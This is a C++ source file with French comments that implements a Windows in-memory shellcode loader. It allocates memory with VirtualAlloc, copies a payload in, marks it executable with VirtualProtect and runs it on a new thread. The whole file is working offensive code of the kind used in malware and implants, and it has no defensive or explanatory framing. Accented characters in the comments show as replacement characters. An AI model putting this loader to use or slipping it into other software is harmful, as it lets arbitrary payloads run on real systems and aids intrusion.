#include "Memory.h"
#include <iostream>

bool injectShellcodeLocal(PBYTE shellcode, SIZE_T shellcodeSize) {
    // Allouer de la m�moire pour le shellcode
    LPVOID allocatedMemory = VirtualAlloc(
        NULL,                           // Adresse pr�f�r�e
        shellcodeSize,                  // Taille de la m�moire
        MEM_COMMIT | MEM_RESERVE,       // Type d'allocation
        PAGE_READWRITE                  // Permissions initiales
    );

    if (!allocatedMemory) {
        std::cerr << "Erreur : VirtualAlloc a �chou� avec l'erreur : " << GetLastError() << std::endl;
        return false;
    }

    std::cout << "M�moire allou�e � l'adresse : " << allocatedMemory << std::endl;

    // Copier le shellcode dans la m�moire allou�e
    memcpy(allocatedMemory, shellcode, shellcodeSize);

    // Modifier les permissions pour ex�cuter le shellcode
    DWORD oldProtect;
    if (!VirtualProtect(allocatedMemory, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "Erreur : VirtualProtect a �chou� avec l'erreur : " << GetLastError() << std::endl;
        VirtualFree(allocatedMemory, 0, MEM_RELEASE);
        return false;
    }

    // Cr�er un thread pour ex�cuter le shellcode
    HANDLE hThread = CreateThread(
        NULL,                           // S�curit� par d�faut
        0,                              // Taille de la pile par d�faut
        (LPTHREAD_START_ROUTINE)allocatedMemory, // Adresse de d�marrage
        NULL,                           // Aucun param�tre
        0,                              // Flags
        NULL                            // ID du thread
    );

    if (!hThread) {
        std::cerr << "Erreur : CreateThread a �chou� avec l'erreur : " << GetLastError() << std::endl;
        VirtualFree(allocatedMemory, 0, MEM_RELEASE);
        return false;
    }

    std::cout << "Thread cr�� avec succ�s pour ex�cuter le shellcode." << std::endl;

    // Attendre la fin du thread
    WaitForSingleObject(hThread, INFINITE);

    // Nettoyer les ressources
    CloseHandle(hThread);
    VirtualFree(allocatedMemory, 0, MEM_RELEASE);

    return true;
}
